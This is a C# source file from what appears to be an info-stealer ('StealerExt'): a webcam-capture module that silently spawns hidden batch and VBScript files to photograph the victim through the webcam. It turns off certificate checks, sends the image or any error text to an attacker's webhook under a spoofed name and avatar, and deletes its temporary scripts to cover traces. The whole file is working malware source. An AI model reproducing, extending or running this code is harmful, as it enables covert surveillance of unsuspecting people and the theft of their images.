using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace StealerExt
{
    public class WebCamCap
    {
        #region Take & Send WebCam Picture
        public static void wcc()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
			string idk = API.Temp + "compile.bat";
			string idk2 = API.Temp + "compile.vbs";
			if (File.Exists(idk)) File.Delete(idk);
			if (File.Exists(idk2)) File.Delete(idk2);
			if (File.Exists(API.Temp + "capture.png")) File.Delete(API.Temp + "capture.png");
			using (StreamWriter streamWriter = File.CreateText(idk))
			{
				streamWriter.WriteLine("start %temp%\\bfsvc.exe /capture /Filename \"%temp%\\capture.png\"");
				streamWriter.WriteLine("exit");
			}
			using (StreamWriter streamWriter2 = File.CreateText(idk2))
			{
				streamWriter2.WriteLine("Dim fso, fName, txt,objshell,UserName,tempfolder");
				streamWriter2.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
				streamWriter2.WriteLine("Set tempfolder = fso.GetSpecialFolder(2)");
				streamWriter2.WriteLine("Set oShell = CreateObject (\"Wscript.Shell\")");
				streamWriter2.WriteLine("Dim strArgs");
				streamWriter2.WriteLine("strArgs = \"cmd /c compile.bat\"");
				streamWriter2.WriteLine("oShell.Run strArgs, 0, True");
			}
			Process proc = new Process();
			proc.StartInfo.WorkingDirectory = API.Temp;
			proc.StartInfo.FileName = "compile.vbs";
			proc.StartInfo.CreateNoWindow = true;
			proc.EnableRaisingEvents = true;
			proc.Start();
			proc.WaitForExit();
			File.Delete(idk);
			File.Delete(idk2);
			string ss = API.Temp + "capture.png";
            while (API.IsFileinUse(new FileInfo(ss)));
            try
            {
                bool flag1 = File.Exists(ss);
                if (flag1)
                {
                    new API(API.wHook)
                    {
                        _name = API.name,
                        _ppUrl = API.pfp
                    }.SendWCC("", ss);
                }
                else
                {
                    new API(API.wHook)
                    {
                        _name = API.name,
                        _ppUrl = API.pfp
                    }.SendWCC("Camera not found", null);
                }
            }
            catch (Exception ex)
            {
                new API(API.wHook)
                {
                    _name = API.name,
                    _ppUrl = API.pfp
                }.SendWCC("Camera ex: " + ex, null);
            }
        }
        #endregion
    }
}
